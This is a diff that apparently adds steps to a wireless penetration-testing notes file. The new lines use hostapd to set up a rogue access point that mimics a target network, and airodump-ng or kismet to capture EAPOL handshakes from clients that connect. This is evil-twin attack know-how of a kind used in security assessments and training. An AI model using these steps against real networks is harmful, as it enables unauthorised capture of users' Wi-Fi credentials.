@@ -39,3 +39,31 @@ Create a .conf file that has these parameters to configure:
 Edit the parameters in the .conf to mimic the tgt AP for Clients to connect to
 
 sudo nano tgtAP.conf
+
+Run collection on one interface pointing to your Rogue AP to collect EAPOL
+sudo airodump-ng -c <CHANNEL> --bssid <rogueMAC> -w <FILENAME> <interface>
+or
+sudo kismet
+
+Run Hostapd to create the Rogue AP
+sudo hostapd <filename.conf>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
